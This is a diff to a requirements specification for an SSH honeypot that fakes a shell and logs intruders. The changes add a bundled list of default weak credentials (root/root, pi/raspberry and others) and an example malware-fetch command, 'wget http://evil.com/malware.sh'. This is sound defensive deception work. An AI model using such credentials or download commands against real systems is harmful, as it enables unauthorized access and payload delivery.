@@ -49,9 +49,11 @@ The `trap-core` feature implements the fake SSH server and scripted Ghost Shell 
 
 1. WHEN an Entity submits a username and password that match an entry in the Credential_List, THE Trap SHALL accept the authentication and open a Session.
 2. WHEN an Entity submits a username and password that do not match any entry in the Credential_List, THE Trap SHALL reject the authentication without revealing the reason.
-3. THE Trap SHALL record a `login_attempt` Event for every authentication attempt (accepted or rejected) containing: session ID, source IP, source port, username, password, SSH client version string, and UTC timestamp.
+3. THE Trap SHALL record a `login_attempt` Event for every authentication attempt (accepted or rejected) containing: session ID, source IP, source port, username, password, SSH client version string, UTC timestamp, and success (`true` if authentication was accepted, `false` if rejected).
 4. THE Trap SHALL support a minimum of 50 concurrent Sessions without blocking the event loop.
 5. IF the Trap encounters an error writing a `login_attempt` Event to the Session_Log, THEN THE Trap SHALL log the error to its own process log and continue accepting connections.
+6. THE Trap SHALL ship a default credential file bundled in the repository containing approximately 30 common weak username/password pairs. The default pairs SHALL include combinations from the following: usernames `root`, `admin`, `ubuntu`, `pi`, `user`; passwords `123456`, `password`, `admin`, `root`, `12345678`, `qwerty`; and the pairs `root/root`, `admin/admin`, `pi/raspberry`, `ubuntu/ubuntu`, `user/user`.
+7. WHEN the `TRAP_ACCEPT_AFTER_ATTEMPTS` environment variable is set to a positive integer N, THE Trap SHALL accept any password on the Nth or subsequent authentication attempt from the same source IP address within a rolling one-hour window, in addition to the normal Credential_List matching. The attempt counter for a source IP SHALL reset one hour after the first recorded attempt from that IP within the current window.
 
 ---
 
@@ -62,9 +64,9 @@ The `trap-core` feature implements the fake SSH server and scripted Ghost Shell 
 #### Acceptance Criteria
 
 1. THE Trap SHALL enforce an Idle_Timeout of the duration specified by the `TRAP_IDLE_TIMEOUT_SECONDS` environment variable, defaulting to `300` seconds.
-2. WHEN a Session has received no input from the Entity for the Idle_Timeout duration, THE Trap SHALL close that Session and write a session-end marker to the Session_Log.
+2. WHEN a Session has received no input from the Entity for the Idle_Timeout duration, THE Trap SHALL close that Session and write a `session_end` Event to the Session_Log.
 3. THE Trap SHALL enforce a Max_Session_Duration of the duration specified by the `TRAP_MAX_SESSION_SECONDS` environment variable, defaulting to `1800` seconds.
-4. WHEN a Session has been open for the Max_Session_Duration, THE Trap SHALL close that Session and write a session-end marker to the Session_Log regardless of recent Entity activity.
+4. WHEN a Session has been open for the Max_Session_Duration, THE Trap SHALL close that Session and write a `session_end` Event to the Session_Log regardless of recent Entity activity.
 5. THE Trap SHALL discard any input line from an Entity that exceeds `Max_Input_Line` characters (4096) and SHALL send the Entity a `bash: line too long` message without closing the Session.
 6. WHEN a Session is closed for any reason, THE Trap SHALL flush and close the Session_Log file.
 
@@ -78,7 +80,7 @@ The `trap-core` feature implements the fake SSH server and scripted Ghost Shell 
 
 1. WHEN a Session is opened successfully, THE Ghost_Shell SHALL send the Entity the MOTD before presenting a shell prompt.
 2. THE Ghost_Shell SHALL include in the MOTD: the hostname `records-srv-09`, a reference to the decommissioned municipal records purpose of the server, and a lore hint about a missing caretaker.
-3. THE Ghost_Shell SHALL present a shell prompt in the format `[username@records-srv-09 <cwd>]$` after the MOTD and after each command response.
+3. THE Ghost_Shell SHALL present a shell prompt after the MOTD and after each command response. The prompt format SHALL be `[username@records-srv-09 <display_cwd>]#` for sessions authenticated as `root` and `[username@records-srv-09 <display_cwd>]$` for all other users. THE Ghost_Shell SHALL substitute `~` for the authenticated user's home directory prefix in `<display_cwd>` (e.g. when the authenticated user is `root` and the current working directory is `/root`, `<display_cwd>` is `~`; when the current working directory is `/root/docs`, `<display_cwd>` is `~/docs`).
 4. THE Fake_Filesystem SHALL be seeded per Session from a template that includes at minimum: a `/vault` directory, a `/home/caretaker/` directory, and the file `/home/caretaker/last_words.txt` containing flavour text.
 5. THE Fake_Filesystem SHALL be independent per Session; changes made by one Entity SHALL NOT be visible to any other concurrent Session.
 
@@ -104,7 +106,7 @@ The `trap-core` feature implements the fake SSH server and scripted Ghost Shell 
 12. WHEN the Entity runs `rm <file>` or `rm -rf <path>`, THE Ghost_Shell SHALL remove the specified file or directory from the Fake_Filesystem; IF the target does not exist, THEN THE Ghost_Shell SHALL return `rm: cannot remove '<path>': No such file or directory`.
 13. WHEN the Entity runs `history`, THE Ghost_Shell SHALL return a numbered list of commands issued during the current Session.
 14. WHEN the Entity runs `chmod <mode> <path>`, THE Ghost_Shell SHALL update the stored permission string for that path in the Fake_Filesystem without executing any real OS call; IF the path does not exist, THEN THE Ghost_Shell SHALL return `chmod: cannot access '<path>': No such file or directory`.
-15. WHEN the Entity runs `exit`, THE Ghost_Shell SHALL close the Session cleanly and write a session-end marker to the Session_Log.
+15. WHEN the Entity runs `exit`, THE Ghost_Shell SHALL close the Session cleanly and write a `session_end` Event to the Session_Log.
 
 ---
 
@@ -115,10 +117,11 @@ The `trap-core` feature implements the fake SSH server and scripted Ghost Shell 
 #### Acceptance Criteria
 
 1. WHEN the Entity runs a command beginning with `wget` or `curl`, THE Ghost_Shell SHALL record a `download_attempt` Event containing the session ID, the full command string, the first URL argument parsed from the command, and a UTC timestamp.
-2. WHEN the Entity runs `wget <url>`, THE Ghost_Shell SHALL print output consistent with a failed download (e.g. `Resolving <host>... failed: Name or service not known`) and SHALL NOT fetch the URL or write any file to the real filesystem.
-3. WHEN the Entity runs `curl <url>`, THE Ghost_Shell SHALL print output consistent with a connection failure and SHALL NOT fetch the URL or write any file to the real filesystem.
-4. IF the Entity attempts to execute a file path that resembles a previously "downloaded" filename (e.g. `./<filename>`), THEN THE Ghost_Shell SHALL return `Segmentation fault (core dumped)`.
-5. THE Ghost_Shell SHALL NOT make any outbound network request as a result of a `wget` or `curl` command.
+2. WHEN the Entity runs `wget <url>`, THE Ghost_Shell SHALL print output consistent with a successful download including plausible progress output (e.g. percentage complete, transfer speed, and file size) and SHALL NOT fetch the URL or write any file to the real filesystem.
+3. WHEN the Entity runs `curl <url>`, THE Ghost_Shell SHALL print output consistent with a successful transfer including plausible transfer statistics and SHALL NOT fetch the URL or write any file to the real filesystem.
+4. WHEN a simulated `wget` or `curl` download completes, THE Ghost_Shell SHALL create a small fake empty file in the Fake_Filesystem at the current working directory using the filename derived from the last path segment of the URL (e.g. `wget http://evil.com/malware.sh` creates `malware.sh` in the current working directory).
+5. IF the Entity attempts to execute a file path that resembles a previously "downloaded" filename (e.g. `./<filename>`), THEN THE Ghost_Shell SHALL return `Segmentation fault (core dumped)`.
+6. THE Ghost_Shell SHALL NOT make any outbound network request as a result of a `wget` or `curl` command.
 
 ---
 
@@ -157,7 +160,7 @@ The `trap-core` feature implements the fake SSH server and scripted Ghost Shell 
 #### Acceptance Criteria
 
 1. THE Trap SHALL create one Session_Log file per Session at the path `<LOG_DIR>/<session_id>.jsonl`, where `LOG_DIR` is read from the `TRAP_LOG_DIR` environment variable.
-2. THE Session_Log SHALL be written in JSON Lines format; each line SHALL be a valid JSON object conforming to the Event schema: `{ "session_id": str, "timestamp": ISO-8601 UTC str, "kind": "login_attempt" | "command" | "response" | "download_attempt", "payload": object, "generated_by": "scripted" | "llm" }`.
+2. THE Session_Log SHALL be written in JSON Lines format; each line SHALL be a valid JSON object conforming to the Event schema: `{ "session_id": str, "timestamp": ISO-8601 UTC str, "kind": "login_attempt" | "command" | "response" | "download_attempt" | "session_start" | "session_end", "payload": object, "generated_by": "scripted" | "llm" }`. The `session_start` Event payload SHALL include source IP, source port, and SSH client version string. The `session_end` Event payload SHALL include a `reason` field with one of: `exit`, `idle_timeout`, `max_duration`, `disconnect`, `log_error`.
 3. WHEN the Ghost_Shell processes a command, THE Trap SHALL write a `command` Event and a corresponding `response` Event to the Session_Log before returning output to the Entity.
 4. THE Trap SHALL write Events to the Session_Log in chronological order with no gaps between a `command` Event and its matching `response` Event.
 5. IF the Session_Log file cannot be created or written, THEN THE Trap SHALL log the filesystem error to its process log and close the Session with an appropriate SSH error message rather than silently losing events.
